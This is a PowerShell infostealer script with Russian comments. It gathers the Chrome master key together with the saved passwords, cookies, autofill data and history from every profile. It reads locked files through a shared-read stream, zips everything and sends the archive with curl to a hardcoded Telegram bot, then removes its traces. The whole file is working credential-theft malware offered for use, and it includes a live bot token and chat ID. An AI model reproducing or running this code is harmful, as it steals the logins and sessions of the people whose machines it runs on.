# Настройки связи
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# Конфигурация путей
$chromeBase = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$workDir = "$env:TEMP\sys_cache_$(Get-Random)"
$zipFile = "$env:TEMP\data_package.zip"

# Создаем рабочую область
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    # 1. Забираем главный ключ (Local State) - без него расшифровка невозможна
    $localState = Join-Path $chromeBase "Local State"
    if (Test-Path $localState) {
        Copy-Item $localState -Destination (Join-Path $workDir "ls.json") -Force
    }

    # 2. Ищем все профили (Default, Profile 1, Profile 2 и т.д.)
    $profiles = Get-ChildItem -Path $chromeBase -Directory | Where-Object { $_.Name -match "Default|Profile" }

    foreach ($profile in $profiles) {
        $pName = $profile.Name
        $targets = @{
            "Login Data" = "pass_$pName.db"
            "Network\Cookies" = "cook_$pName.db"
            "Web Data" = "web_$pName.db"
            "History" = "hist_$pName.db"
        }

        foreach ($relPath in $targets.Keys) {
            $source = Join-Path $profile.FullName $relPath
            if (Test-Path $source) {
                # Используем хитрый способ копирования, чтобы не конфликтовать с открытым Chrome
                $dest = Join-Path $workDir $targets[$relPath]
                try {
                    # Пытаемся скопировать через теневое чтение
                    $stream = [System.IO.File]::Open($source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                    $outStream = [System.IO.File]::Create($dest)
                    $stream.CopyTo($outStream)
                    $stream.Close()
                    $outStream.Close()
                } catch {
                    # Если не вышло через стрим, пробуем обычный Copy-Item
                    Copy-Item $source -Destination $dest -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }

    # 3. Упаковка всего собранного
    if ((Get-ChildItem $workDir).Count -gt 0) {
        Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
        
        # 4. Отправка архива
        $uri = "https://api.telegram.org/bot$token/sendDocument"
        & curl.exe -s -X POST $uri -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Full Package: LS + DBs (Success)" | Out-Null
    }

} catch {
    # В случае критического сбоя отправляем короткий лог
    $m = $_.Exception.Message
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Fail: $m"
} finally {
    # Полная зачистка следов
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path $zipFile) { Remove-Item $zipFile -Force -ErrorAction SilentlyContinue }
}
